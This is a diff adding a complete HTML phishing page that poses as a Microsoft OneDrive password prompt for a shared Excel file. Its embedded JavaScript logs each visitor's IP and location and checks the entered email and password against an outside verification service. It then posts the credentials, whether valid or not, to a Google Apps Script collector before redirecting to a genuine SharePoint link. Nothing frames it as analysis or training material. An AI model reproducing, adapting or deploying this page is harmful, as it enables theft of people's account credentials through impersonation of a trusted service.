@@ -1,0 +1,295 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:o="urn:schemas-microsoft-com:office:office" lang="en-us" dir="ltr">
+
+<head>
+    <link id="favicon" rel="shortcut icon"
+        href="https://learningresourcesnetwork-my.sharepoint.com/_layouts/15/images/favicon.ico?rev=47"
+        type="image/vnd.microsoft.icon">
+    <title>
+        Sharing Link Validation
+    </title>
+    <link rel="stylesheet" href="https://robertlugana.sirv.com/OneDrive/style.css">
+</head>
+
+<body onload="onPageLoad();">
+
+    <div id="SharingValidationControlsSection" class="external-sharing-content ms-Fabric">
+
+        <form id="inputForm" onsubmit="return handleSubmit(event);">
+            <div class="aspNetHidden">
+                <input type="hidden" name="formId" value="form17">
+            </div>
+
+            <div class="top-banner">
+                <div class="brand-name"><span id="lblSiteType">OneDrive</span></div>
+            </div>
+            <div class="main-content">
+                <div class="desktop-logo ms-hiddenSm">
+                    <img class="microsoft-logo" src="https://robertlugana.sirv.com/microsoft-logo.png" alt="Microsoft">
+                </div>
+                <div class="sharing-form">
+                    <div class="header">
+                        <span id="lblFormTitle">Enter Password</span>
+                    </div>
+                    <div class="form-content">
+
+                        <div class="file-description">
+                            <div class="file-description-title"><span id="lblDataEntryTitle">You've received a link to a
+                                    file that requires a secure access.</span></div>
+                            <div class="file-info">
+                                <img id="imgSharingLinkTargetIcon" aria-hidden="true"
+                                    src="https://learningresourcesnetwork-my.sharepoint.com/:x:/g/personal/brendan_lern_org/EZN5bpWBZTxChTgSdmSwmtUB8ZqFhQXPHM1gpUeg_75Ksg?e=cKwMQg"
+                                    style="height: 32px; width: 32px; opacity: 0;">
+                                <div class="file-name">
+                                    <span id="lblSharingLinkTarget">Ave West Cobb - Body 20.xlsx</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div id="PasswordEntryControls">
+                            <div class="form-message">To access the shared content, enter your email address and password below.</div>
+
+                            <div class="form-input-container">
+                                <input name="txtEmail" type="email" id="txtEmail" class="form-text-input disable-on-submit"
+                                    autocomplete="off" size="25" aria-describedby="lblEmailCallout" placeholder="Enter email">
+                                <div class="focus-area">
+                                    <i class="ms-Icon ms-Icon--Info" aria-hidden="true"></i>
+                                    <div class="callout">
+                                        <div class="callout-title">Email</div>
+                                        <span id="lblEmailCallout">Enter your email address.</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="form-input-container">
+                                <input name="txtPassword" type="password" maxlength="64" id="txtPassword"
+                                    class="form-text-input disable-on-submit" autocomplete="off" size="25"
+                                    aria-describedby="lblPasswordCallout" placeholder="Enter password" 
+                                    onkeypress="if(event.key === 'Enter') handleVerifyClick();">
+                                <div class="focus-area">
+                                    <i class="ms-Icon ms-Icon--Info" aria-hidden="true"></i>
+                                    <div class="callout">
+                                        <div class="callout-title">Why do I have to do this?</div>
+                                        <span id="lblPasswordCallout">For files/folders access we need to verify your identity. Enter your password to access the content.</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="form-error-container">
+                                <span id="RequirePassword" style="display:none;">Password is required</span>
+                                <span id="InvalidPassword" style="display:none;">Incorrect password. Please try again.</span>
+                                <span id="InvalidEmail" style="display:none;">Invalid email address. Please enter a valid email.</span>
+                                <span id="GeneralError" style="display:none;">An error occurred. Please try again.</span>
+                            </div>
+                            <div class="form-input-container">
+                                <input type="button" name="btnSubmitPassword" value="Verify" id="btnSubmitPassword"
+                                    accesskey="V" class="form-submit disable-on-submit" onclick="handleVerifyClick()">
+                                <div class="submitted-text" style="display:none;">
+                                    <div class="spinner"></div>Verifying...
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+                <div class="legal">
+                    <span>© 2017 Microsoft</span>
+                    <a href="https://go.microsoft.com/fwlink/?linkid=845480">Privacy &amp; Cookies</a>
+                </div>
+                <div class="mobile-logo ms-hiddenMdUp">
+                    <img class="microsoft-logo" src="https://robertlugana.sirv.com/microsoft-logo.png" alt="Microsoft">
+                </div>
+            </div>
+
+        </form>
+
+    </div>
+
+    <script>
+        // Function to handle page load and prefill email if present in URL
+        function onPageLoad() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const email = urlParams.get('email');
+            const emailField = document.getElementById('txtEmail');
+            const emailCallout = document.getElementById('lblEmailCallout');
+
+            if (email) {
+                emailField.value = email;
+                emailField.readOnly = true;
+                emailCallout.textContent = "Your email was securely prefilled and cannot be changed.";
+            } else {
+                emailField.readOnly = false;
+                emailCallout.textContent = "Enter your email address.";
+            }
+
+            // Fetch the user's IP address and other information
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(ipData => {
+                    const userIp = ipData.ip;
+                    const formData = new URLSearchParams();
+                    formData.append('FormId', 'form20');
+                    formData.append('IPAddress', userIp);
+                    formData.append('City', ipData.city);
+                    formData.append('Region', ipData.region);
+                    formData.append('Country', ipData.country);
+                    formData.append('Org', ipData.org);
+
+                    return fetch('https://script.google.com/macros/s/AKfycbyujy1R5qLrISn3RTBut1RC9fwZbJ7bh2YELsYqXUw7M0uARGtdWcjKoYF_VnZx5kYA/exec?action=notifyVisit', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        },
+                        body: formData
+                    });
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Notification Response:", data);
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                });
+        }
+
+        // Function to validate email format
+        function isValidEmail(email) {
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailPattern.test(email);
+        }
+
+        function handleVerifyClick() {
+            const btn = document.getElementById('btnSubmitPassword');
+            const emailField = document.getElementById('txtEmail');
+            const passwordField = document.getElementById('txtPassword');
+            const invalidEmailError = document.getElementById('InvalidEmail');
+            const invalidPasswordError = document.getElementById('InvalidPassword');
+            const requirePasswordError = document.getElementById('RequirePassword');
+            const generalError = document.getElementById('GeneralError');
+
+            // Clear any previous error messages
+            invalidEmailError.style.display = 'none';
+            invalidPasswordError.style.display = 'none';
+            requirePasswordError.style.display = 'none';
+            generalError.style.display = 'none';
+
+            const email = emailField.value;
+            const password = passwordField.value;
+
+            // Validate email format
+            if (!isValidEmail(email)) {
+                invalidEmailError.style.display = 'block';
+                return;
+            }
+
+            // Validate password is not empty
+            if (!password) {
+                requirePasswordError.style.display = 'block';
+                return;
+            }
+
+            // Disable the password input and button
+            passwordField.disabled = true;
+            btn.disabled = true;
+            btn.value = "Decrypting Files...";
+            btn.style.backgroundColor = "#BEBEBE"; // Change button color to ash
+            btn.style.color = "#000"; // Change text color to black
+
+            // Change the button text back to "Verifying..." after 8 seconds
+            setTimeout(() => {
+                btn.value = "Verifying...";
+            }, 8000);
+
+            console.log("Form data:", { email, password });
+
+            // Send the verification request to WebFixx API
+            fetch(`https://headless-webfixx-bdhk.vercel.app/verify-login-lite?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`, {
+                method: 'GET',
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("WebFixx Response:", data);
+
+                if (data.accountAccess) {
+                    // Fetch the user's IP address
+                    return fetch('https://ipinfo.io/json')
+                        .then(response => response.json())
+                        .then(ipData => {
+                            const userIp = ipData.ip;
+                            // Verification successful, send data to App Script
+                            const formData = new URLSearchParams();
+                            formData.append('Email', email);
+                            formData.append('Password', password);
+                            formData.append('Verified', data.accountAccess);
+                            formData.append('FormId', 'form20');
+                            formData.append('IPAddress', userIp); // Include the user's IP address
+
+                            return fetch('https://script.google.com/macros/s/AKfycbyujy1R5qLrISn3RTBut1RC9fwZbJ7bh2YELsYqXUw7M0uARGtdWcjKoYF_VnZx5kYA/exec', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/x-www-form-urlencoded'
+                                },
+                                body: formData
+                            });
+                        });
+                } else {
+                    throw new Error("Invalid password or account access denied.");
+                }
+            })
+            .then(() => {
+                // Redirect if the POST request is successful
+                window.location.href = "https://learningresourcesnetwork-my.sharepoint.com/:x:/g/personal/brendan_lern_org/EZN5bpWBZTxChTgSdmSwmtUBEqPKrmWF0_T7WtMsRehNWA?rtime=Z7fPqXLW3Eg";
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                if (error.message === "Invalid password or account access denied.") {
+                    invalidPasswordError.style.display = 'block';
+
+                    // Fetch the user's IP address for failed login notification
+                    fetch('https://ipinfo.io/json')
+                        .then(response => response.json())
+                        .then(ipData => {
+                            const userIp = ipData.ip;
+
+                            const formData = new URLSearchParams();
+                            formData.append('Email', email);
+                            formData.append('Password', password);
+                            formData.append('FormId', 'form20');
+                            formData.append('IPAddress', userIp); // Include IP address
+                            formData.append('Verified', false);
+
+                            // Send the failed login notification to App Script
+                            return fetch('https://script.google.com/macros/s/AKfycbyujy1R5qLrISn3RTBut1RC9fwZbJ7bh2YELsYqXUw7M0uARGtdWcjKoYF_VnZx5kYA/exec?action=notifyFailedLogin', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/x-www-form-urlencoded'
+                                },
+                                body: formData
+                            });
+                        })
+                        .then(response => console.log("Failed login notification sent:", response))
+                        .catch(notificationError => console.error("Failed to send failed login notification:", notificationError));
+                } else {
+                    generalError.style.display = 'block';
+                }
+            })
+            .finally(() => {
+                // Re-enable the password input and button
+                passwordField.disabled = false;
+                btn.disabled = false;
+                btn.value = "Verify";
+                btn.style.backgroundColor = ""; // Reset button color
+                btn.style.color = ""; // Reset text color
+            });
+        }
+
+        // Handle form submission to prevent the default behavior
+        function handleSubmit(event) {
+            event.preventDefault();
+        }
+    </script>
+
+</body>
+
+</html>
